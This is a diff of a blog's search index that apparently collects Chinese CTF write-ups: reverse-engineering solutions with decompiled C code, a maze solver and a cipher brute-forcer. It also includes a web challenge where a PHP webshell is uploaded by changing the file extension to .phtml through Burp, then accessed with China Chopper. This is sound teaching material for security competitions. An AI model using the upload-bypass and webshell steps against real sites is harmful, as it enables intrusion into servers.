+<p>解法很常规, 分析算法, 写出解密程序</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> ciphertext[<span class="number">32</span>] = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>;</span><br><span class="line">	<span class="type">char</span> plaintext[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">char</span> c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++)	<span class="comment">//逐位穷举所有ASCII可打印字符</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> temp = c;</span><br><span class="line">			<span class="keyword">if</span> (c &gt; <span class="number">64</span> &amp;&amp; c &lt;= <span class="number">90</span>)</span><br><span class="line">				temp = (c - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c &gt; <span class="number">96</span> &amp;&amp; c &lt;= <span class="number">122</span>)</span><br><span class="line">				temp = (c - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">			<span class="keyword">if</span> (temp == ciphertext[i])</span><br><span class="line">				plaintext[i] = c;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ACTF&#123;%s&#125;&quot;</span>, plaintext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ACTF&#123;Cae3ar_th4_Gre@t&#125;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>二进制</tag>
+        <tag>逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[BUUCTF]不一样的flag</title>
+    <url>/2022/01/21/%5BReverse%5D%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/</url>
+    <content><![CDATA[<p>无壳, 直接拖进<code>IDA</code>分析, F5查看伪代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();		<span class="comment">//源程序应该是C++写的, __main()函数调用了一个构造函数, 不管</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);	<span class="comment">//奇怪的数字</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>); <span class="comment">//好家伙, 我输入的就是flag?真够不一样的</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反编译出来的伪代码可读性极差, 花了很长时间写出等效形式的代码,
+如下</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> char_arr[<span class="number">25</span>];</span><br><span class="line">	<span class="type">int</span> x_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> y_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">strncpy</span>(char_arr, <span class="string">&quot;*11110100001010000101111#&quot;</span>, <span class="number">25</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;you can choose one action to execute\n1 up\n2 down\n3 left\n4 right\n:&quot;</span>);</span><br><span class="line">		<span class="type">int</span> temp;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;temp);</span><br><span class="line">		<span class="keyword">switch</span> (temp)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			--x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			++x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			--y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			++y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x_pos &lt; <span class="number">0</span> || x_pos &gt; <span class="number">4</span> || y_pos &lt; <span class="number">0</span> || y_pos &gt; <span class="number">4</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样看结构清晰很多,
+就是把<code>*11110100001010000101111#</code>这个字符串排成一个<code>5x5</code>的迷宫</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0  1  2  3  4</span><br><span class="line">   -------------→</span><br><span class="line">0 | *  1  1  1  1</span><br><span class="line">1 | 0  1  0  0  0</span><br><span class="line">2 | 0  1  0  1  0</span><br><span class="line">3 | 0  0  0  1  0</span><br><span class="line">4 ↓ 1  1  1  1  #</span><br><span class="line">横为Y轴,竖为X轴, 0是路, 1是墙,*是起点, #是终点</span><br><span class="line">走出迷宫只需要&quot;下下下右右上上右右下下下&quot;, 即&quot;222441144222&quot;</span><br></pre></td></tr></table></figure>
+<p>所以<strong>flag</strong>就是<code>flag&#123;222441144222&#125;</code></p>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>二进制</tag>
+        <tag>逆向</tag>
       </tags>
   </entry>
   <entry>
@@ -884,27 +905,6 @@ alt="image-20220123002452161" />
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INT_PTR __stdcall <span class="title function_">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">2</span>]; <span class="comment">// [esp+8h] [ebp-20030h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+10h] [ebp-20028h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+14h] [ebp-20024h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+18h] [ebp-20020h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+20h] [ebp-20018h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-20014h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-20010h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-20008h]</span></span><br><span class="line">  CHAR String[<span class="number">65536</span>]; <span class="comment">// [esp+34h] [ebp-20004h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">65536</span>]; <span class="comment">// [esp+10034h] [ebp-10004h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7[<span class="number">0</span>] = <span class="number">90</span>;</span><br><span class="line">      v7[<span class="number">1</span>] = <span class="number">74</span>;</span><br><span class="line">      v8 = <span class="number">83</span>;</span><br><span class="line">      v9 = <span class="number">69</span>;</span><br><span class="line">      v10 = <span class="number">67</span>;</span><br><span class="line">      v11 = <span class="number">97</span>;</span><br><span class="line">      v12 = <span class="number">78</span>;</span><br><span class="line">      v13 = <span class="number">72</span>;</span><br><span class="line">      v14 = <span class="number">51</span>;</span><br><span class="line">      v15 = <span class="number">110</span>;</span><br><span class="line">      v16 = <span class="number">103</span>;</span><br><span class="line">      sub_4010F0((<span class="type">int</span>)v7, <span class="number">0</span>, <span class="number">10</span>);    <span class="comment">//将v7[0]、v7[1]以及v8~v16进行升序排序</span></span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">5</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">7</span>];</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">6</span>];</span><br><span class="line">      v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(v18, <span class="built_in">strlen</span>(v18));  <span class="comment">//对String的5~7位进行base64编码</span></span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">3</span>];</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">2</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">4</span>];</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(v18, <span class="built_in">strlen</span>(v18));  <span class="comment">//对String的2~4位进行base64编码</span></span><br><span class="line">      <span class="keyword">if</span> ( String[<span class="number">0</span>] == v7[<span class="number">0</span>] + <span class="number">34</span>  <span class="comment">//String[0]=&#x27;U&#x27;, v7=&#x27;3&#x27;</span></span><br><span class="line">        &amp;&amp; String[<span class="number">1</span>] == v10         <span class="comment">//String[1]=&#x27;J&#x27;, v10=&#x27;J&#x27;</span></span><br><span class="line">        &amp;&amp; <span class="number">4</span> * String[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * v8    <span class="comment">//String[2]=&#x27;W&#x27;, v8=&#x27;E&#x27;</span></span><br><span class="line">        &amp;&amp; String[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (v13 / <span class="number">9</span>)   <span class="comment">//String[3]=&#x27;P&#x27;, v13=&#x27;Z&#x27;</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)      <span class="comment">//base64解码可知String[5]~String[7]=&quot;jMp&quot;</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )    <span class="comment">//同理String[2]~String[4]=&quot;WP1&quot;</span></span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, (<span class="type">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>把<code>String</code>的8位连起来就是<code>UJWP1jMp</code>,
 所以<strong>flag</strong>就是<code>flag&#123;UJWP1jMp&#125;</code></p>
-]]></content>
-      <categories>
-        <category>Reverse</category>
-      </categories>
-      <tags>
-        <tag>二进制</tag>
-        <tag>逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[BUUCTF]不一样的flag</title>
-    <url>/2022/01/21/%5BReverse%5D%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/</url>
-    <content><![CDATA[<p>无壳, 直接拖进<code>IDA</code>分析, F5查看伪代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();		<span class="comment">//源程序应该是C++写的, __main()函数调用了一个构造函数, 不管</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);	<span class="comment">//奇怪的数字</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>); <span class="comment">//好家伙, 我输入的就是flag?真够不一样的</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>反编译出来的伪代码可读性极差, 花了很长时间写出等效形式的代码,
-如下</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> char_arr[<span class="number">25</span>];</span><br><span class="line">	<span class="type">int</span> x_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> y_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">strncpy</span>(char_arr, <span class="string">&quot;*11110100001010000101111#&quot;</span>, <span class="number">25</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;you can choose one action to execute\n1 up\n2 down\n3 left\n4 right\n:&quot;</span>);</span><br><span class="line">		<span class="type">int</span> temp;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;temp);</span><br><span class="line">		<span class="keyword">switch</span> (temp)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			--x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			++x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			--y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			++y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x_pos &lt; <span class="number">0</span> || x_pos &gt; <span class="number">4</span> || y_pos &lt; <span class="number">0</span> || y_pos &gt; <span class="number">4</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这样看结构清晰很多,
-就是把<code>*11110100001010000101111#</code>这个字符串排成一个<code>5x5</code>的迷宫</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0  1  2  3  4</span><br><span class="line">   -------------→</span><br><span class="line">0 | *  1  1  1  1</span><br><span class="line">1 | 0  1  0  0  0</span><br><span class="line">2 | 0  1  0  1  0</span><br><span class="line">3 | 0  0  0  1  0</span><br><span class="line">4 ↓ 1  1  1  1  #</span><br><span class="line">横为Y轴,竖为X轴, 0是路, 1是墙,*是起点, #是终点</span><br><span class="line">走出迷宫只需要&quot;下下下右右上上右右下下下&quot;, 即&quot;222441144222&quot;</span><br></pre></td></tr></table></figure>
-<p>所以<strong>flag</strong>就是<code>flag&#123;222441144222&#125;</code></p>
 ]]></content>
       <categories>
         <category>Reverse</category>
@@ -1125,54 +1125,6 @@ alt="image-20211030131706602" />
       </tags>
   </entry>
   <entry>
-    <title>[ACTF2020 新生赛]Upload 1</title>
-    <url>/2021/11/01/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload-1/</url>
-    <content><![CDATA[<p>进去就是个灯泡, 鼠标移到灯泡上出现文件选择框</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122375.png"
-alt="image-20211101212238225" />
-<figcaption aria-hidden="true">image-20211101212238225</figcaption>
-</figure>
-<p>试着上传一个<code>php</code>后缀一句话木马</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122521.png"
-alt="image-20211101212227434" />
-<figcaption aria-hidden="true">image-20211101212227434</figcaption>
-</figure>
-<p>前端限制后缀, 直接BP抓包改后缀</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012118453.png"
-alt="image-20211101211857333" />
-<figcaption aria-hidden="true">image-20211101211857333</figcaption>
-</figure>
-<p>后端也有限制, 传统艺能, 改后缀为<code>phtml</code></p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012120107.png"
-alt="image-20211101212015986" />
-<figcaption aria-hidden="true">image-20211101212015986</figcaption>
-</figure>
-<p>文件直接上传成功, 接下来就是菜刀时间</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012121920.png"
-alt="image-20211101212139849" />
-<figcaption aria-hidden="true">image-20211101212139849</figcaption>
-</figure>
-<p><strong>flag</strong>就在根目录</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[GXYCTF2019]Ping Ping Ping 1</title>
     <url>/2021/10/30/%5BWeb%5DGXYCTF2019-Ping-Ping-Ping-1/</url>
     <content><![CDATA[<p>看页面提示, 显然是<code>get</code>请求提交参数, 输入一个ip试试水</p>
@@ -1271,6 +1223,124 @@ alt="image-20211031123455770" />
       </tags>
   </entry>
   <entry>
+    <title>[ACTF2020 新生赛]Upload 1</title>
+    <url>/2021/11/01/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload-1/</url>
+    <content><![CDATA[<p>进去就是个灯泡, 鼠标移到灯泡上出现文件选择框</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122375.png"
+alt="image-20211101212238225" />
+<figcaption aria-hidden="true">image-20211101212238225</figcaption>
+</figure>
+<p>试着上传一个<code>php</code>后缀一句话木马</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122521.png"
+alt="image-20211101212227434" />
+<figcaption aria-hidden="true">image-20211101212227434</figcaption>
+</figure>
+<p>前端限制后缀, 直接BP抓包改后缀</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012118453.png"
+alt="image-20211101211857333" />
+<figcaption aria-hidden="true">image-20211101211857333</figcaption>
+</figure>
